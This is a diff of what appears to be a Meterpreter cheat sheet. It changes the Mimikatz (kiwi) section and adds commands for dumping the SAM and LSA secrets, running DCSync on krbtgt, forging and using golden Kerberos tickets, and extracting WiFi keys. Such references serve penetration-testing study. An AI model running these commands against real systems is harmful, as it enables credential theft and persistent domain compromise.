@@ -221,21 +221,24 @@ run post/windows/gather/credentials/gpp
 
 # Mimikatz
 
-load kiwi                                                   Load Mimikatz
-creds_all                                                   Retrieve all credentials
+load kiwi                                                    Load Mimikatz
+help kiwi                                                    Show help
 
-creds_kerberos                                              Retrieve Kerberos creds
-creds_livessp                                               Retrieve LiveSSP creds
-creds_msv                                                   Retrieve LM/NTLM creds (hashes)
-creds_ssp                                                   Retrieve SSP creds
-creds_tspkg                                                 Retrieve TsPkg creds
-creds_wdigest                                               Retrieve WDigest creds
-golden_ticket_create                                        Create a golden kerberos ticket
-kerberos_ticket_list                                        List all kerberos tickets
-kerberos_ticket_purge                                       Purge any in-use kerberos tickets
-kerberos_ticket_use                                         Use a kerberos ticket
-lsa_dump_sam                                                Dump LSA SAM
-lsa_dump_secrets                                            Dump LSA secrets
+lsa_dump_sam                                                 Dump LSA SAM
+lsa_dump_secrets                                             Dump LSA secrets
+
+password_change -u <user> -p <old password> -P <new password>
+
+dcsync_ntlm krbtgt
+dcsync krbtgt 
+
+golden_ticket_create -d <domain> -u <user> -s <SID> -k
+kerberos_ticket_use /root/<domain>
+shell
+
+creds_all                                                    Dump hashes and credentials
+
+wifi_list                                                    Dump WiFi names and shared keys
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Steal tokens
